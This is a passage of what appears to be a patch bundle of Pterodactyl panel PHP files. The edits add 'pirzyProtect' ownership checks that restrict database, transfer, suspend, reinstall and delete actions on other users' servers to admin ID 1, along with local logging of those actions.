    /**
     * 🧱 pirzyProtect  v1.1 — Anti Database Abuse
     * Melindungi agar user biasa tidak bisa membuat/menghapus database server milik orang lain.
     */
    public function create(Server $server, array $data): Database
    {
        $user = Auth::user();

        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id ?? $server->user_id ?? null;

            if ($ownerId !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat membuat database untuk server orang lain! ©Protect By @Pirzyy1');
            }
        }

        if (!config('pterodactyl.client_features.databases.enabled')) {
            throw new DatabaseClientFeatureNotEnabledException();
        }

        if ($this->validateDatabaseLimit) {
            if (!is_null($server->database_limit) && $server->databases()->count() >= $server->database_limit) {
                throw new TooManyDatabasesException();
            }
        }

        if (empty($data['database']) || !preg_match(self::MATCH_NAME_REGEX, $data['database'])) {
            throw new \\InvalidArgumentException('The database name must be prefixed with "s{server_id}_".');
        }

        $data = array_merge($data, [
            'server_id' => $server->id,
            'username' => sprintf('u%d_%s', $server->id, str_random(10)),
            'password' => $this->encrypter->encrypt(
                Utilities::randomStringWithSpecialCharacters(24)
            ),
        ]);

        $database = null;

        try {
            return $this->connection->transaction(function () use ($data, &$database) {
                $database = $this->createModel($data);

                $this->dynamic->set('dynamic', $data['database_host_id']);
                $this->repository->createDatabase($database->database);
                $this->repository->createUser(
                    $database->username,
                    $database->remote,
                    $this->encrypter->decrypt($database->password),
                    $database->max_connections
                );
                $this->repository->assignUserToDatabase($database->database, $database->username, $database->remote);
                $this->repository->flush();

                return $database;
            });
        } catch (\\Exception $exception) {
            try {
                if ($database instanceof Database) {
                    $this->repository->dropDatabase($database->database);
                    $this->repository->dropUser($database->username, $database->remote);
                    $this->repository->flush();
                }
            } catch (\\Exception $deletionException) {
                // Ignore cleanup errors
            }

            throw $exception;
        }
    }

    public function delete(Database $database): ?bool
    {
        $user = Auth::user();

        if ($user && $user->id !== 1) {
            $server = Server::find($database->server_id);
            if ($server && $server->owner_id !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat menghapus database server orang lain! ©Protect By @Pirzyy1');
            }
        }

        $this->dynamic->set('dynamic', $database->database_host_id);

        $this->repository->dropDatabase($database->database);
        $this->repository->dropUser($database->username, $database->remote);
        $this->repository->flush();

        return $database->delete();
    }

    protected function createModel(array $data): Database
    {
        $exists = Database::query()->where('server_id', $data['server_id'])
            ->where('database', $data['database'])
            ->exists();

        if ($exists) {
            throw new DuplicateDatabaseNameException('A database with that name already exists for this server.');
        }

        $database = (new Database())->forceFill($data);
        $database->saveOrFail();

        return $database;
    }
}`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Transfer This Server)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerTransferController.php",
        file: "ServerTransferController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Servers;

use Carbon\\CarbonImmutable;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\Server;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Models\\ServerTransfer;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Nodes\\NodeJWTService;
use Pterodactyl\\Repositories\\Eloquent\\NodeRepository;
use Pterodactyl\\Repositories\\Wings\\DaemonTransferRepository;
use Pterodactyl\\Contracts\\Repository\\AllocationRepositoryInterface;
use Pterodactyl\\Exceptions\\DisplayException;

class ServerTransferController extends Controller
{
    /**
     * ServerTransferController constructor.
     */
    public function __construct(
        private AlertsMessageBag $alert,
        private AllocationRepositoryInterface $allocationRepository,
        private ConnectionInterface $connection,
        private DaemonTransferRepository $daemonTransferRepository,
        private NodeJWTService $nodeJWTService,
        private NodeRepository $nodeRepository
    ) {
    }

    /**
     * Starts a transfer of a server to a new node.
     *
     * @throws \\Throwable
     */
    public function transfer(Request $request, Server $server): RedirectResponse
    {
        $user = auth()->user();

        // 🧱 pirzyProtect  v1.2 — Anti Unauthorized Server Transfer
        if ($user && $user->id !== 1) {
            $ownerId = $server->owner_id
                ?? $server->user_id
                ?? ($server->owner?->id ?? null)
                ?? ($server->user?->id ?? null);

            if ($ownerId === null) {
                throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');
            }

            if ($ownerId !== $user->id) {
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mentransfer server orang lain! ©Protect By @Pirzyy1');
            }
        }

        $validatedData = $request->validate([
            'node_id' => 'required|exists:nodes,id',
            'allocation_id' => 'required|bail|unique:servers|exists:allocations,id',
            'allocation_additional' => 'nullable',
        ]);

        $node_id = $validatedData['node_id'];
        $allocation_id = intval($validatedData['allocation_id']);
        $additional_allocations = array_map('intval', $validatedData['allocation_additional'] ?? []);

        // Check if the node is viable for the transfer.
        $node = $this->nodeRepository->getNodeWithResourceUsage($node_id);
        if (!$node->isViable($server->memory, $server->disk)) {
            $this->alert->danger(trans('admin/server.alerts.transfer_not_viable'))->flash();

            return redirect()->route('admin.servers.view.manage', $server->id);
        }

        $server->validateTransferState();

        $this->connection->transaction(function () use ($server, $node_id, $allocation_id, $additional_allocations) {
            // Create a new ServerTransfer entry.
            $transfer = new ServerTransfer();

            $transfer->server_id = $server->id;
            $transfer->old_node = $server->node_id;
            $transfer->new_node = $node_id;
            $transfer->old_allocation = $server->allocation_id;
            $transfer->new_allocation = $allocation_id;
            $transfer->old_additional_allocations = $server->allocations->where('id', '!=', $server->allocation_id)->pluck('id');
            $transfer->new_additional_allocations = $additional_allocations;

            $transfer->save();

            // Add the allocations to the server, so they cannot be automatically assigned while the transfer is in progress.
            $this->assignAllocationsToServer($server, $node_id, $allocation_id, $additional_allocations);

            // Generate a token for the destination node that the source node can use to authenticate with.
            $token = $this->nodeJWTService
                ->setExpiresAt(CarbonImmutable::now()->addMinutes(15))
                ->setSubject($server->uuid)
                ->handle($transfer->newNode, $server->uuid, 'sha256');

            // Notify the source node of the pending outgoing transfer.
            $this->daemonTransferRepository->setServer($server)->notify($transfer->newNode, $token);

            return $transfer;
        });

        $this->alert->success(trans('admin/server.alerts.transfer_started'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Assigns the specified allocations to the specified server.
     */
    private function assignAllocationsToServer(Server $server, int $node_id, int $allocation_id, array $additional_allocations)
    {
        $allocations = $additional_allocations;
        $allocations[] = $allocation_id;

        $unassigned = $this->allocationRepository->getUnassignedAllocationIds($node_id);

        $updateIds = [];
        foreach ($allocations as $allocation) {
            if (!in_array($allocation, $unassigned)) {
                continue;
            }

            $updateIds[] = $allocation;
        }

        if (!empty($updateIds)) {
            $this->allocationRepository->updateWhereIn('id', $updateIds, ['server_id' => $server->id]);
        }
    }
}`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Suspend Status)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php",
        file: "ServersController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\User;
use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Mount;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Database;
use Pterodactyl\\Models\\MountServer;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Validation\\ValidationException;
use Pterodactyl\\Services\\Servers\\SuspensionService;
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;
use Pterodactyl\\Services\\Servers\\ServerDeletionService;
use Pterodactyl\\Services\\Servers\\ReinstallServerService;
use Pterodactyl\\Exceptions\\Model\\DataValidationException;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Services\\Servers\\BuildModificationService;
use Pterodactyl\\Services\\Databases\\DatabasePasswordService;
use Pterodactyl\\Services\\Servers\\DetailsModificationService;
use Pterodactyl\\Services\\Servers\\StartupModificationService;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Repositories\\Eloquent\\DatabaseHostRepository;
use Pterodactyl\\Services\\Databases\\DatabaseManagementService;
use Illuminate\\Contracts\\Config\\Repository as ConfigRepository;
use Pterodactyl\\Contracts\\Repository\\ServerRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\AllocationRepositoryInterface;
use Pterodactyl\\Services\\Servers\\ServerConfigurationStructureService;
use Pterodactyl\\Http\\Requests\\Admin\\Servers\\Databases\\StoreServerDatabaseRequest;

class ServersController extends Controller
{
    /**
     * ServersController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected AllocationRepositoryInterface $allocationRepository,
        protected BuildModificationService $buildModificationService,
        protected ConfigRepository $config,
        protected DaemonServerRepository $daemonServerRepository,
        protected DatabaseManagementService $databaseManagementService,
        protected DatabasePasswordService $databasePasswordService,
        protected DatabaseRepositoryInterface $databaseRepository,
        protected DatabaseHostRepository $databaseHostRepository,
        protected ServerDeletionService $deletionService,
        protected DetailsModificationService $detailsModificationService,
        protected ReinstallServerService $reinstallService,
        protected ServerRepositoryInterface $repository,
        protected MountRepository $mountRepository,
        protected NestRepositoryInterface $nestRepository,
        protected ServerConfigurationStructureService $serverConfigurationStructureService,
        protected StartupModificationService $startupModificationService,
        protected SuspensionService $suspensionService
    ) {
    }

    /**
     * Update the details for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function setDetails(Request $request, Server $server): RedirectResponse
    {
        $this->detailsModificationService->handle($server, $request->only([
            'owner_id', 'external_id', 'name', 'description',
        ]));

        $this->alert->success(trans('admin/server.alerts.details_updated'))->flash();

        return redirect()->route('admin.servers.view.details', $server->id);
    }

public function toggleInstall(Server $server): RedirectResponse
{
    $user = auth()->user();

    // 🧱 pirzyProtect  v1.2 — Anti Unauthorized Toggle Install
    if ($user && $user->id !== 1) {
        $ownerId = $server->owner_id
            ?? $server->user_id
            ?? ($server->owner?->id ?? null)
            ?? ($server->user?->id ?? null);

        if ($ownerId === null) {
            throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');
        }

        if ($ownerId !== $user->id) {
            throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah status instalasi server orang lain! ©Protect By @Pirzyy1');
        }
    }

    if ($server->status === Server::STATUS_INSTALL_FAILED) {
        throw new DisplayException(trans('admin/server.exceptions.marked_as_failed'));
    }

    $this->repository->update($server->id, [
        'status' => $server->isInstalled() ? Server::STATUS_INSTALLING : null,
    ], true, true);

    $this->alert->success(trans('admin/server.alerts.install_toggled'))->flash();

    return redirect()->route('admin.servers.view.manage', $server->id);
}

    /**
     * Reinstalls the server with the currently assigned service.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function reinstallServer(Server $server): RedirectResponse
    {
        $this->reinstallService->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_reinstalled'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Manage the suspension status for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
public function manageSuspension(Request $request, Server $server): RedirectResponse
{
    $user = auth()->user();

    // 🧱 pirzyProtect  v1.2 — Anti Suspend Server Tanpa Izin
    if ($user && $user->id !== 1) {
        $ownerId = $server->owner_id
            ?? $server->user_id
            ?? ($server->owner?->id ?? null)
            ?? ($server->user?->id ?? null);

        if ($ownerId === null) {
            throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');
        }

        if ($ownerId !== $user->id) {
            throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mensuspend server orang lain! ©Protect By @Pirzyy1');
        }
    }

    // Jalankan proses suspend/unsuspend
    $this->suspensionService->toggle($server, $request->input('action'));

    $this->alert->success(trans('admin/server.alerts.suspension_toggled', [
        'status' => $request->input('action') . 'ed',
    ]))->flash();

    return redirect()->route('admin.servers.view.manage', $server->id);
}

    /**
     * Update the build configuration for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function updateBuild(Request $request, Server $server): RedirectResponse
    {
        try {
            $this->buildModificationService->handle($server, $request->only([
                'allocation_id', 'add_allocations', 'remove_allocations',
                'memory', 'swap', 'io', 'cpu', 'threads', 'disk',
                'database_limit', 'allocation_limit', 'backup_limit', 'oom_disabled',
            ]));
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.build_updated'))->flash();

        return redirect()->route('admin.servers.view.build', $server->id);
    }

    /**
     * Start the server deletion process.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Throwable
     */
    public function delete(Request $request, Server $server): RedirectResponse
    {
        $this->deletionService->withForce($request->filled('force_delete'))->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_deleted'))->flash();

        return redirect()->route('admin.servers');
    }

    /**
     * Update the startup command as well as variables.
     *
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function saveStartup(Request $request, Server $server): RedirectResponse
    {
        $data = $request->except('_token');
        if (!empty($data['custom_docker_image'])) {
            $data['docker_image'] = $data['custom_docker_image'];
            unset($data['custom_docker_image']);
        }

        try {
            $this->startupModificationService
                ->setUserLevel(User::USER_LEVEL_ADMIN)
                ->handle($server, $data);
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.startup_changed'))->flash();

        return redirect()->route('admin.servers.view.startup', $server->id);
    }

    /**
     * Creates a new database assigned to a specific server.
     *
     * @throws \\Throwable
     */
    public function newDatabase(StoreServerDatabaseRequest $request, Server $server): RedirectResponse
    {
        $this->databaseManagementService->create($server, [
            'database' => DatabaseManagementService::generateUniqueDatabaseName($request->input('database'), $server->id),
            'remote' => $request->input('remote'),
            'database_host_id' => $request->input('database_host_id'),
            'max_connections' => $request->input('max_connections'),
        ]);

        return redirect()->route('admin.servers.view.database', $server->id)->withInput();
    }

    /**
     * Resets the database password for a specific database on this server.
     *
     * @throws \\Throwable
     */
    public function resetDatabasePassword(Request $request, Server $server): Response
    {
        /** @var \\Pterodactyl\\Models\\Database $database */
        $database = $server->databases()->findOrFail($request->input('database'));

        $this->databasePasswordService->handle($database);

        return response('', 204);
    }

    /**
     * Deletes a database from a server.
     *
     * @throws \\Exception
     */
    public function deleteDatabase(Server $server, Database $database): Response
    {
        $this->databaseManagementService->delete($database);

        return response('', 204);
    }

    /**
     * Add a mount to a server.
     *
     * @throws \\Throwable
     */
    public function addMount(Request $request, Server $server): RedirectResponse
    {
        $mountServer = (new MountServer())->forceFill([
            'mount_id' => $request->input('mount_id'),
            'server_id' => $server->id,
        ]);

        $mountServer->saveOrFail();

        $this->alert->success('Mount was added successfully.')->flash();

        return redirect()->route('admin.servers.view.mounts', $server->id);
    }

    /**
     * Remove a mount from a server.
     */
    public function deleteMount(Server $server, Mount $mount): RedirectResponse
    {
        MountServer::where('mount_id', $mount->id)->where('server_id', $server->id)->delete();

        $this->alert->success('Mount was removed successfully.')->flash();

        return redirect()->route('admin.servers.view.mounts', $server->id);
    }
}`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Toggle Status)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php",
        file: "ServersController.php",
        code: `<?php  
  
namespace Pterodactyl\\Http\\Controllers\\Admin;  
  
use Illuminate\\Http\\Request;  
use Pterodactyl\\Models\\User;  
use Illuminate\\Http\\Response;  
use Pterodactyl\\Models\\Mount;  
use Pterodactyl\\Models\\Server;  
use Pterodactyl\\Models\\Database;  
use Pterodactyl\\Models\\MountServer;  
use Illuminate\\Http\\RedirectResponse;  
use Prologue\\Alerts\\AlertsMessageBag;  
use Pterodactyl\\Exceptions\\DisplayException;  
use Pterodactyl\\Http\\Controllers\\Controller;  
use Illuminate\\Validation\\ValidationException;  
use Pterodactyl\\Services\\Servers\\SuspensionService;  
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;  
use Pterodactyl\\Services\\Servers\\ServerDeletionService;  
use Pterodactyl\\Services\\Servers\\ReinstallServerService;  
use Pterodactyl\\Exceptions\\Model\\DataValidationException;  
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;  
use Pterodactyl\\Services\\Servers\\BuildModificationService;  
use Pterodactyl\\Services\\Databases\\DatabasePasswordService;  
use Pterodactyl\\Services\\Servers\\DetailsModificationService;  
use Pterodactyl\\Services\\Servers\\StartupModificationService;  
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;  
use Pterodactyl\\Repositories\\Eloquent\\DatabaseHostRepository;  
use Pterodactyl\\Services\\Databases\\DatabaseManagementService;  
use Illuminate\\Contracts\\Config\\Repository as ConfigRepository;  
use Pterodactyl\\Contracts\\Repository\\ServerRepositoryInterface;  
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;  
use Pterodactyl\\Contracts\\Repository\\AllocationRepositoryInterface;  
use Pterodactyl\\Services\\Servers\\ServerConfigurationStructureService;  
use Pterodactyl\\Http\\Requests\\Admin\\Servers\\Databases\\StoreServerDatabaseRequest;  
  
class ServersController extends Controller  
{  
    public function __construct(  
        protected AlertsMessageBag $alert,  
        protected AllocationRepositoryInterface $allocationRepository,  
        protected BuildModificationService $buildModificationService,  
        protected ConfigRepository $config,  
        protected DaemonServerRepository $daemonServerRepository,  
        protected DatabaseManagementService $databaseManagementService,  
        protected DatabasePasswordService $databasePasswordService,  
        protected DatabaseRepositoryInterface $databaseRepository,  
        protected DatabaseHostRepository $databaseHostRepository,  
        protected ServerDeletionService $deletionService,  
        protected DetailsModificationService $detailsModificationService,  
        protected ReinstallServerService $reinstallService,  
        protected ServerRepositoryInterface $repository,  
        protected MountRepository $mountRepository,  
        protected NestRepositoryInterface $nestRepository,  
        protected ServerConfigurationStructureService $serverConfigurationStructureService,  
        protected StartupModificationService $startupModificationService,  
        protected SuspensionService $suspensionService  
    ) {  
    }  
  
    public function setDetails(Request $request, Server $server): RedirectResponse  
    {  
        $this->detailsModificationService->handle($server, $request->only([  
            'owner_id', 'external_id', 'name', 'description',  
        ]));  
  
        $this->alert->success(trans('admin/server.alerts.details_updated'))->flash();  
  
        return redirect()->route('admin.servers.view.details', $server->id);  
    }  
  
    public function toggleInstall(Server $server): RedirectResponse  
    {  
        $user = auth()->user();  
  
        if ($user && $user->id !== 1) {  
            $ownerId = $server->owner_id  
                ?? $server->user_id  
                ?? ($server->owner?->id ?? null)  
                ?? ($server->user?->id ?? null);  
  
            if ($ownerId === null) {  
                throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');  
            }  
  
            if ($ownerId !== $user->id) {  
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mengubah status instalasi server orang lain! ©Protect By @Pirzyy1');  
            }  
        }  
  
        if ($server->status === Server::STATUS_INSTALL_FAILED) {  
            throw new DisplayException(trans('admin/server.exceptions.marked_as_failed'));  
        }  
  
        $this->repository->update($server->id, [  
            'status' => $server->isInstalled() ? Server::STATUS_INSTALLING : null,  
        ], true, true);  
  
        $this->alert->success(trans('admin/server.alerts.install_toggled'))->flash();  
  
        return redirect()->route('admin.servers.view.manage', $server->id);  
    }  
  
    public function reinstallServer(Server $server): RedirectResponse  
    {  
        $this->reinstallService->handle($server);  
        $this->alert->success(trans('admin/server.alerts.server_reinstalled'))->flash();  
  
        return redirect()->route('admin.servers.view.manage', $server->id);  
    }  
  
    public function manageSuspension(Request $request, Server $server): RedirectResponse  
    {  
        $user = auth()->user();  
  
        if ($user && $user->id !== 1) {  
            $ownerId = $server->owner_id  
                ?? $server->user_id  
                ?? ($server->owner?->id ?? null)  
                ?? ($server->user?->id ?? null);  
  
            if ($ownerId === null) {  
                throw new DisplayException('⚠️ Akses ditolak: Informasi pemilik server tidak ditemukan.');  
            }  
  
            if ($ownerId !== $user->id) {  
                throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat mensuspend server orang lain! ©Protect By @Pirzyy1');  
            }  
        }  
  
        $this->suspensionService->toggle($server, $request->input('action'));  
  
        $this->alert->success(trans('admin/server.alerts.suspension_toggled', [  
            'status' => $request->input('action') . 'ed',  
        ]))->flash();  
  
        return redirect()->route('admin.servers.view.manage', $server->id);  
    }  
  
    public function updateBuild(Request $request, Server $server): RedirectResponse  
    {  
        try {  
            $this->buildModificationService->handle($server, $request->only([  
                'allocation_id', 'add_allocations', 'remove_allocations',  
                'memory', 'swap', 'io', 'cpu', 'threads', 'disk',  
                'database_limit', 'allocation_limit', 'backup_limit', 'oom_disabled',  
            ]));  
        } catch (DataValidationException $exception) {  
            throw new ValidationException($exception->getValidator());  
        }  
  
        $this->alert->success(trans('admin/server.alerts.build_updated'))->flash();  
  
        return redirect()->route('admin.servers.view.build', $server->id);  
    }  
  
    public function delete(Request $request, Server $server): RedirectResponse  
    {  
        $this->deletionService->withForce($request->filled('force_delete'))->handle($server);  
        $this->alert->success(trans('admin/server.alerts.server_deleted'))->flash();  
  
        return redirect()->route('admin.servers');  
    }  
  
    public function saveStartup(Request $request, Server $server): RedirectResponse  
    {  
        $data = $request->except('_token');  
        if (!empty($data['custom_docker_image'])) {  
            $data['docker_image'] = $data['custom_docker_image'];  
            unset($data['custom_docker_image']);  
        }  
  
        try {  
            $this->startupModificationService  
                ->setUserLevel(User::USER_LEVEL_ADMIN)  
                ->handle($server, $data);  
        } catch (DataValidationException $exception) {  
            throw new ValidationException($exception->getValidator());  
        }  
  
        $this->alert->success(trans('admin/server.alerts.startup_changed'))->flash();  
  
        return redirect()->route('admin.servers.view.startup', $server->id);  
    }  
  
    public function newDatabase(StoreServerDatabaseRequest $request, Server $server): RedirectResponse  
    {  
        $this->databaseManagementService->create($server, [  
            'database' => DatabaseManagementService::generateUniqueDatabaseName($request->input('database'), $server->id),  
            'remote' => $request->input('remote'),  
            'database_host_id' => $request->input('database_host_id'),  
            'max_connections' => $request->input('max_connections'),  
        ]);  
  
        return redirect()->route('admin.servers.view.database', $server->id)->withInput();  
    }  
  
    public function resetDatabasePassword(Request $request, Server $server): Response  
    {  
        $database = $server->databases()->findOrFail($request->input('database'));  
  
        $this->databasePasswordService->handle($database);  
  
        return response('', 204);  
    }  
  
    public function deleteDatabase(Server $server, Database $database): Response  
    {  
        $this->databaseManagementService->delete($database);  
  
        return response('', 204);  
    }  
  
    public function addMount(Request $request, Server $server): RedirectResponse  
    {  
        $mountServer = (new MountServer())->forceFill([  
            'mount_id' => $request->input('mount_id'),  
            'server_id' => $server->id,  
        ]);  
  
        $mountServer->saveOrFail();  
  
        $this->alert->success('Mount was added successfully.')->flash();  
  
        return redirect()->route('admin.servers.view.mounts', $server->id);  
    }  
  
    public function deleteMount(Server $server, Mount $mount): RedirectResponse  
    {  
        MountServer::where('mount_id', $mount->id)->where('server_id', $server->id)->delete();  
  
        $this->alert->success('Mount was removed successfully.')->flash();  
  
        return redirect()->route('admin.servers.view.mounts', $server->id);  
    }  
}`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Reinstall Status)",
        path: "/var/www/pterodactyl/app/Services/Servers/ReinstallServerService.php",
        file: "ReinstallServerService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Models\\Server;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Illuminate\\Support\\Facades\\Log;

class ReinstallServerService
{
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository
    ) {}

    /**
     * 🧱 pirzyProtect  v1.2 — Anti Reinstall Server Orang Lain
     * Hanya Admin ID 1 atau pemilik server yang bisa menjalankan reinstall.
     */
    public function handle(Server $server): Server
    {
        $user = Auth::user();

        // 🔒 Proteksi akses
        if ($user) {
            if ($user->id !== 1) {
                $ownerId = $server->owner_id
                    ?? $server->user_id
                    ?? ($server->owner?->id ?? null)
                    ?? ($server->user?->id ?? null);

                if ($ownerId === null) {
                    throw new DisplayException('Akses ditolak: informasi pemilik server tidak tersedia.');
                }

                if ($ownerId !== $user->id) {
                    throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat me-reinstall server orang lain! ©Protect By @Pirzyy1');
                }
            }
        }

        // 🧾 Log siapa yang melakukan reinstall
        Log::channel('daily')->info('🔄 Reinstall Server', [
            'server_id' => $server->id,
            'server_name' => $server->name ?? 'Unknown',
            'reinstalled_by' => $user?->id ?? 'CLI/Unknown',
            'time' => now()->toDateTimeString(),
        ]);

        // ⚙️ Jalankan reinstall
        return $this->connection->transaction(function () use ($server) {
            $server->fill(['status' => Server::STATUS_INSTALLING])->save();

            $this->daemonServerRepository->setServer($server)->reinstall();

            return $server->refresh();
        });
    }
}`
      },
      {
        name: "PROTECT1 (Anti Delete Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/ServerDeletionService.php",
        file: "ServerDeletionService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Facades\\Auth;
use Pterodactyl\\Exceptions\\DisplayException;
use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Server;
use Illuminate\\Support\\Facades\\Log;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Services\\Databases\\DatabaseManagementService;
use Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException;

class ServerDeletionService
{
    protected bool $force = false;

    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository,
        private DatabaseManagementService $databaseManagementService
    ) {}

    /**
     * Aktifkan mode "Force Delete"
     */
    public function withForce(bool $bool = true): self
    {
        $this->force = $bool;
        return $this;
    }

    /**
     * 🧱 pirzyProtect  v1.1 — Anti Delete Server + Force Delete Logger
     * Melindungi agar pengguna biasa tidak dapat menghapus server orang lain.
     * Juga menambahkan pencatatan log khusus bila admin melakukan Force Delete.
     */
    public function handle(Server $server): void
    {
        $user = Auth::user();

        // 🔒 Cegah selain Admin ID 1 menghapus server milik orang lain
        if ($user) {
            if ($user->id !== 1) {
                $ownerId = $server->owner_id
                    ?? $server->user_id
                    ?? ($server->owner?->id ?? null)
                    ?? ($server->user?->id ?? null);

                if ($ownerId === null) {
                    throw new DisplayException('Akses ditolak: informasi pemilik server tidak tersedia.');
                }

                if ($ownerId !== $user->id) {
                    throw new DisplayException('🚫 Akses ditolak: Hanya Admin ID 1 yang dapat menghapus server orang lain! ©Protect By @Pirzyy1');
                }
            }
        }

        // 🧾 Log tambahan bila Force Delete dijalankan
        if ($this->force === true) {
            Log::channel('daily')->info('⚠️ FORCE DELETE DETECTED', [
                'server_id' => $server->id,
                'server_name' => $server->name ?? 'Unknown',
                'deleted_by' => $user?->id ?? 'CLI/Unknown',
                'time' => now()->toDateTimeString(),
            ]);

            Log::build([
                'driver' => 'single',
                'path' => storage_path('logs/force_delete.log'),
            ])->info("⚠️ FORCE DELETE SERVER #{$server->id} ({$server->name}) oleh User ID {$user?->id}");
        }

        // 🔧 Hapus data dari Daemon (Wings)
        try {
            $this->daemonServerRepository->setServer($server)->delete();
        } catch (DaemonConnectionException $exception) {
            if (!$this->force && $exception->getStatusCode() !== Response::HTTP_NOT_FOUND) {
                throw $exception;
            }
            Log::warning($exception);
        }

        // 🧹 Hapus database & record panel
        $this->connection->transaction(function () use ($server) {
            foreach ($server->databases as $database) {
                try {
                    $this->databaseManagementService->delete($database);
                } catch (\\Exception $exception) {
                    if (!$this->force) throw $exception;
                    $database->delete();
                    Log::warning($exception);
                }
            }

            $server->delete();
        });
    }
}`
      },
      {
        name: "PROTECT2 (ANTI INTIP USERS & ANTI CADMIN)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/UserController.php",
        file: "UserController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Model;
use Illuminate\\Support\\Collection;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Spatie\\QueryBuilder\\QueryBuilder;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Contracts\\Translation\\Translator;
use Pterodactyl\\Services\\Users\\UserUpdateService;
use Pterodactyl\\Traits\\Helpers\\AvailableLanguages;
use Pterodactyl\\Services\\Users\\UserCreationService;
use Pterodactyl\\Services\\Users\\UserDeletionService;
use Pterodactyl\\Http\\Requests\\Admin\\UserFormRequest;
use Pterodactyl\\Http\\Requests\\Admin\\NewUserFormRequest;
use Pterodactyl\\Contracts\\Repository\\UserRepositoryInterface;

class UserController extends Controller
{
